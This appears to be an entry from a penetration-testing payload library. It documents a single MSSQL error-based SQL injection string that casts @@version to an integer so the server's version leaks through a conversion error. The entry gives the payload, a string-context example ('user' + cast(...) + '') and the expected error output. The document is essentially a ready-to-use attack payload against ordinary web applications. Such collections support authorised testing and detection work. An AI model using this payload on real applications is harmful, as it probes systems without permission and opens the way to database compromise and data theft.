---
id: 6e02fe43-9271-4ead-b09e-9a0701095cf1
name: cast-string-@@version
type: command
executor: sql
data: ''' + cast((SELECT @@version) as int) + '''
output: null
created_at: '2023-04-06T03:56:33.816032+00:00'
updated_at: '2023-04-10T20:22:41.312777+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - sql-injection
  - error-based
verified: true
validated: true
---

# cast-string-@@version

## Command

```sql
' + cast((SELECT @@version) as int) + '
```

## Description

String concatenation payload using CAST to force an integer conversion on @@version, generating an error that discloses the server version. Suitable for string injection points in MSSQL applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @@version | Version info variable | Yes (built-in) |
| int | Cast type | Yes (built-in) |

## Examples

### String Context Injection

```sql
user' + cast((SELECT @@version) as int) + '
```

## Expected Output

Database error revealing: "... converting the varchar value 'Microsoft SQL Server ...' to data type int."

## Related

- [[procedures/MSSQL-Error-Based-Injection-to-Extract-Version]]
- [[commands/convert-string-@@version]]
